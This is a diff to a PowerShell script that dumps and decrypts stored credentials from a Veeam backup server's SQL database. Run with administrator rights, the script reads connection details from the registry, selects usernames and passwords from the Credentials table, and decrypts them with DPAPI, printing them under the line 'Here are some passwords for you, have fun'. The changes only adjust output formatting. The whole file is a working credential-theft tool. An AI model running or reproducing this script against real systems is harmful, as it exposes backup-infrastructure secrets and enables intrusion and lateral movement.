@@ -8,7 +8,6 @@
 # Usage:  Run as administrator (elevated) in PowerShell on a host in a Veeam 
 #         server.
 
-
 Add-Type -assembly System.Security
 
 #Searching for connection parameters in the registry
@@ -24,10 +23,10 @@ catch {
 }
 
 ""
-Write-Host "Found Veeam DB on "$SqlServerName"\"$SqlInstanceName"@"$SqlDatabaseName" connecting...  " -NoNewLine
+"Found Veeam DB on " + $SqlServerName + "\" + $SqlInstanceName + "@" + $SqlDatabaseName + ", connecting...  "
 
 #Forming the connection string
-$SQL = "SELECT [user_name],[password] FROM [$SqlDatabaseName].[dbo].[Credentials] "+
+$SQL = "SELECT [user_name] AS 'User name',[password] AS 'Password' FROM [$SqlDatabaseName].[dbo].[Credentials] "+
 	"WHERE password <> ''" #Filter empty passwords
 $auth = "Integrated Security=SSPI;" #Local user
 $connectionString = "Provider=sqloledb; Data Source=$SqlServerName\$SqlInstanceName; " +
@@ -48,7 +47,7 @@ catch {
 	exit -1
 }
 
-"Done"
+"OK"
 
 $rows=($dataset.Tables | Select-Object -Expand Rows)
 if ($rows.count -eq 0) {
@@ -56,16 +55,15 @@ if ($rows.count -eq 0) {
 	exit
 }
 
+""
+"Here are some passwords for you, have fun:"
+
 #Decrypting passwords using DPAPI
 $rows | ForEach-Object -Process {
 	$EnryptedPWD = [Convert]::FromBase64String($_.password)
 	$ClearPWD = [System.Security.Cryptography.ProtectedData]::Unprotect( $EnryptedPWD, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine )
 	$enc = [system.text.encoding]::Default
 	$_.password = $enc.GetString($ClearPWD)
-	
 }
-
-""
-"Here are some passwords for you, have fun:" 
-$rows
-""
+ 
+Write-Output $rows | FT | Out-string
